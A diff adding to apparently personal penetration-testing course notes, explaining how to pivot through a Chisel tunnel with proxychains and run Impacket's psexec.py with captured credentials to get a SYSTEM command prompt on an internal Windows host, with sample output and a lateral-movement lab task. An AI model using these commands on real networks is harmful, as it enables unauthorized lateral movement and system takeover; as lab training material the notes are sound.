@@ -506,6 +506,28 @@ Exploit target:
 
 ## PsExec
 * PsExec is a command-line tool that allows you to remotely execute commands on other machines without needing a remote desktop or terminal session. With your Chisen tunnel and `proxychains` rerouting traffic, you'll now be bale to reach the internal network with PsExec. The syntax for running this command is: `proxychains ./psexec.py <Domain>/<Username>:<Password>@<Internal Machine IP>`.
+* You can run PsExec either from the directory the script is in with `./` or by providing the full file path to it. You'll also need to specify the domain, username, password, and the internal machine's IP address. Once run, you'll see both a combination of `proxychains` and PsExec's output as it shows the traffic routing over the proxy server, before moving onto PsExec's progress. This outcome shows how the tools work together to authenticate and connect to the target using your compromised machine credentials. Once authenticated, PsExec performs several operations before a command prompt appears at the bottom - you've now gained admin access to the internal machine:
+```
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
+|S-chain|-<>-127.0.0.1:1080-<><>-<Internal Machine IP>:445-<><>-OK
+[*] Requesting shares on <Internal Machine IP>.....
+[*] Found writable share ADMIN$
+[*] Uploading file DtZVKPTH.exe
+[*] Opening SVCManager on <Internal Machine IP>.....
+[*] Creating service DxFy on <Internal Machine IP>.....
+[*] Starting service DxFy.....
+|S-chain|-<>-127.0.0.1:1080-<><>-<Internal Machine IP>:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-<Internal Machine IP>:445-<><>-OK
+[!] Press help for extra shell commands
+|S-chain|-<>-127.0.0.1:1080-<><>-<Internal Machine IP>:445-<><>-OK
+Microsoft Windows [Version 10.0.20348.3207]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+### LAB: Lateral Movement
+* In this lab, you've gained access to Target 1 with administrator privileges and you need to laterally move to Target 2, which is on an internal network and is currently unreachable by the Kali instance. You'll first neeed to set up Chisen on both Kali and Target 1 and configure the `/etc/proxychains.conf` file. Once configured, use `proxychains` and PsExec to connec to Target 2. 
 
 
